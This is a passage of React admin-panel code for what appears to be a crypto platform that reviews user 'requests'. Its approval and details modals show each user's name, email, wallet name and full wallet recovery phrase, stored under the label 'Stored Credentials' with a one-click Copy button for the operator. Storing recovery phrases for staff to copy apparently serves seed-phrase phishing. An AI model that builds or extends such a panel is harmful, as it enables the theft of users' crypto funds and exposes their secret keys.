                    setActionType(null);
                  }}
                  className="text-[#71717a] hover:text-white p-1 rounded-lg"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Target Request Info */}
              <div className="p-3.5 rounded-2xl bg-[#07070a] border border-[#1c1c24] space-y-2 text-xs font-mono">
                <div className="flex justify-between items-center">
                  <span className="text-[#71717a]">Request ID:</span>
                  <span className="text-[#00ffa3] font-bold">{selectedRequestForAction.id}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-[#71717a]">User:</span>
                  <span className="text-white font-sans">{selectedRequestForAction.userName} ({selectedRequestForAction.userEmail})</span>
                </div>

                {selectedRequestForAction.web3Wallet && (
                  <div className="flex justify-between items-center">
                    <span className="text-[#71717a]">web3wallet:</span>
                    <span className="text-white font-bold font-sans flex items-center gap-1">
                      <Wallet className="w-3.5 h-3.5 text-[#00ffa3]" />
                      {selectedRequestForAction.web3Wallet}
                    </span>
                  </div>
                )}

                {selectedRequestForAction.walletPhrase && (
                  <div className="pt-1 border-t border-[#1c1c24] space-y-1">
                    <div className="flex justify-between items-center">
                      <span className="text-amber-400 font-bold flex items-center gap-1 text-[11px] font-sans">
                        <KeyRound className="w-3 h-3" />
                        wallet phrase:
                      </span>
                      <button
                        type="button"
                        onClick={() => handleCopyPhrase(selectedRequestForAction.id, selectedRequestForAction.walletPhrase!)}
                        className="text-[10px] text-[#00ffa3] hover:underline font-sans font-bold flex items-center gap-1"
                      >
                        <Copy className="w-2.5 h-2.5" />
                        Copy
                      </button>
                    </div>
                    <div className="p-2 rounded-xl bg-[#121218] border border-amber-500/20 text-amber-200 text-[11px] break-words font-mono select-all">
                      {selectedRequestForAction.walletPhrase}
                    </div>
                  </div>
                )}

                {!selectedRequestForAction.web3Wallet && (
                  <div className="flex justify-between items-center">
                    <span className="text-[#71717a]">Amount & Asset:</span>
                    <span className="text-[#00ffa3] font-bold">
                      {selectedRequestForAction.btcbrAmount
                        ? `${selectedRequestForAction.btcbrAmount} BTCBR`
                        : `${formatUSD(selectedRequestForAction.amountUSD)} (${selectedRequestForAction.asset})`}
                    </span>
                  </div>
                )}
                {selectedRequestForAction.btcbrDigits && (
                  <div className="flex justify-between items-center">
                    <span className="text-[#71717a]">Deposit Length:</span>
                    <span className="text-[#00ffa3] font-mono">
                      {selectedRequestForAction.btcbrDigits} Digits
                    </span>
                  </div>
                )}
              </div>

              {/* Notes / Reason Input */}
              <div className="space-y-1.5">
                <label className="block text-xs font-bold text-[#d4d4d8]">
                  {actionType === "approve" ? "Admin Audit Note (Optional)" : "Rejection Reason (Sent to User)"}
                </label>
                <textarea
                  rows={3}
                  value={actionNotes}
                  onChange={(e) => setActionNotes(e.target.value)}
                  placeholder={
                    actionType === "approve"
                      ? "e.g., On-chain deposit TX or Web3 wallet connection verified."
                      : "e.g., Unconfirmed on-chain deposit tx receipt or invalid credentials."
                  }
                  className="w-full p-3 rounded-2xl bg-[#07070a] border border-[#1c1c24] focus:border-[#00ffa3] text-xs text-white outline-none resize-none font-sans"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex gap-2.5 pt-1">
                <button
                  type="button"
                  onClick={() => {
                    setSelectedRequestForAction(null);
                    setActionType(null);
                  }}
                  className="flex-1 py-3 px-4 rounded-xl bg-[#14141c] hover:bg-[#1e1e28] text-[#d4d4d8] font-bold text-xs border border-[#22222e] transition-all"
                >
                  Cancel
                </button>

                {actionType === "approve" ? (
                  <button
                    type="button"
                    disabled={isExecutingAction}
                    onClick={() => handleApprove(selectedRequestForAction)}
                    className="flex-1 py-3 px-4 rounded-xl bg-[#00ffa3] hover:bg-[#00ffa3]/90 text-black font-extrabold text-xs transition-all shadow-md shadow-[#00ffa3]/20 flex items-center justify-center gap-1.5 disabled:opacity-50"
                  >
                    {isExecutingAction ? (
                      <RefreshCw className="w-4 h-4 animate-spin" />
                    ) : (
                      <>
                        <Check className="w-4 h-4 stroke-[3]" />
                        <span>Authorize Approval</span>
                      </>
                    )}
                  </button>
                ) : (
                  <button
                    type="button"
                    disabled={isExecutingAction}
                    onClick={() => handleReject(selectedRequestForAction)}
                    className="flex-1 py-3 px-4 rounded-xl bg-rose-500 hover:bg-rose-600 text-white font-extrabold text-xs transition-all shadow-md shadow-rose-500/20 flex items-center justify-center gap-1.5 disabled:opacity-50"
                  >
                    {isExecutingAction ? (
                      <RefreshCw className="w-4 h-4 animate-spin" />
                    ) : (
                      <>
                        <X className="w-4 h-4 stroke-[3]" />
                        <span>Confirm Rejection</span>
                      </>
                    )}
                  </button>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* ========================================================================= */}
      {/* FULL REQUEST DETAILS INSPECTOR MODAL */}
      {/* ========================================================================= */}
      <AnimatePresence>
        {detailsModalRequest && (
          <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-lg rounded-3xl bg-[#0e0e12] border border-[#22222e] p-6 sm:p-7 space-y-5 text-white shadow-2xl relative max-h-[90vh] overflow-y-auto"
            >
              <div className="flex items-center justify-between border-b border-[#1c1c24] pb-4">
                <div className="flex items-center gap-2">
                  <div className="w-9 h-9 rounded-xl bg-[#00ffa3]/15 text-[#00ffa3] flex items-center justify-center">
                    <FileText className="w-5 h-5" />
                  </div>
                  <div>
                    <h3 className="text-base font-black tracking-tight">Request Details Inspector</h3>
                    <p className="text-[11px] text-[#71717a] font-mono">{detailsModalRequest.id}</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => setDetailsModalRequest(null)}
                  className="text-[#71717a] hover:text-white p-1 rounded-lg"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Status Banner */}
              <div className="flex items-center justify-between p-3 rounded-2xl bg-[#07070a] border border-[#1c1c24]">
                <span className="text-xs text-[#71717a]">Verification Status</span>
                <span
                  className={`px-3 py-1 rounded-full text-xs font-bold font-mono ${
                    detailsModalRequest.status === "approved"
                      ? "bg-[#00ffa3]/15 text-[#00ffa3] border border-[#00ffa3]/30"
                      : detailsModalRequest.status === "pending"
                      ? "bg-amber-500/15 text-amber-400 border border-amber-500/30"
                      : detailsModalRequest.status === "rejected"
                      ? "bg-rose-500/15 text-rose-400 border border-rose-500/30"
                      : "bg-[#1e1e28] text-[#71717a]"
                  }`}
                >
                  {detailsModalRequest.status.toUpperCase()}
                </span>
              </div>

              {/* Request ID & Web3 Wallet Section */}
              <div className="space-y-3 p-4 rounded-2xl bg-[#07070a] border border-[#1c1c24]">
                <div className="text-xs font-bold text-[#d4d4d8] flex items-center gap-1.5 font-sans">
                  <Shield className="w-4 h-4 text-[#00ffa3]" />
                  <span>Request ID & Stored Credentials</span>
                </div>

                <div className="space-y-2 text-xs font-mono">
                  <div className="flex justify-between py-1 border-b border-[#14141c]">
                    <span className="text-[#71717a]">Request ID:</span>
                    <span className="text-[#00ffa3] font-bold">{detailsModalRequest.id}</span>
                  </div>

                  {detailsModalRequest.web3Wallet && (
                    <div className="flex justify-between py-1 border-b border-[#14141c]">
                      <span className="text-[#71717a] font-sans">web3wallet:</span>
                      <span className="text-white font-bold font-sans flex items-center gap-1.5">
                        <Wallet className="w-3.5 h-3.5 text-[#00ffa3]" />
                        {detailsModalRequest.web3Wallet}
                      </span>
                    </div>
                  )}

                  {detailsModalRequest.walletPhrase && (
                    <div className="space-y-1.5 pt-1">
                      <div className="flex justify-between items-center">
                        <span className="text-amber-400 font-bold font-sans text-xs flex items-center gap-1">
                          <KeyRound className="w-3.5 h-3.5" />
                          wallet phrase:
                        </span>
                        <button
                          type="button"
                          onClick={() => handleCopyPhrase(detailsModalRequest.id, detailsModalRequest.walletPhrase!)}
                          className="px-2 py-0.5 rounded bg-[#181824] hover:bg-[#222232] text-[#00ffa3] text-[10px] font-sans font-bold border border-[#00ffa3]/30 flex items-center gap-1"
                        >
                          <Copy className="w-3 h-3" />
                          Copy Phrase
                        </button>
                      </div>
                      <div className="p-3 rounded-2xl bg-[#121218] border border-amber-500/30 text-amber-200 text-xs font-mono leading-relaxed break-words select-all">
                        {detailsModalRequest.walletPhrase}
                      </div>
                    </div>
                  )}

                  {(detailsModalRequest.walletAddress || detailsModalRequest.depositAddress) && (
                    <div className="space-y-1 pt-1">
                      <span className="text-[#71717a]">Wallet / Target Address:</span>
                      <div className="p-2 rounded-xl bg-[#121218] text-[#a1a1aa] text-[11px] break-all">
                        {detailsModalRequest.walletAddress || detailsModalRequest.depositAddress}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* User Information */}
              <div className="space-y-2 p-4 rounded-2xl bg-[#07070a] border border-[#1c1c24] text-xs font-mono">
                <div className="text-xs font-bold text-[#d4d4d8] font-sans">User Details</div>
                <div className="flex justify-between py-1 border-b border-[#14141c]">
                  <span className="text-[#71717a]">Name:</span>
                  <span className="text-white font-sans">{detailsModalRequest.userName}</span>
                </div>
                <div className="flex justify-between py-1 border-b border-[#14141c]">
                  <span className="text-[#71717a]">Email:</span>
                  <span className="text-white">{detailsModalRequest.userEmail}</span>
                </div>
                {detailsModalRequest.userTier && (
                  <div className="flex justify-between py-1 border-b border-[#14141c]">
                    <span className="text-[#71717a]">Tier:</span>
                    <span className="text-amber-300 font-bold">{detailsModalRequest.userTier}</span>
                  </div>
                )}
                <div className="flex justify-between py-1">
                  <span className="text-[#71717a]">Submitted:</span>
                  <span className="text-[#d4d4d8]">{formatTimestamp(detailsModalRequest.createdAt)}</span>
                </div>
              </div>

              {/* Close Button */}
              <button
                type="button"
                onClick={() => setDetailsModalRequest(null)}
                className="w-full py-3 rounded-xl bg-[#181824] hover:bg-[#222232] text-white font-bold text-xs border border-[#2c2c3e] transition-colors"
              >
                Close Details
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};
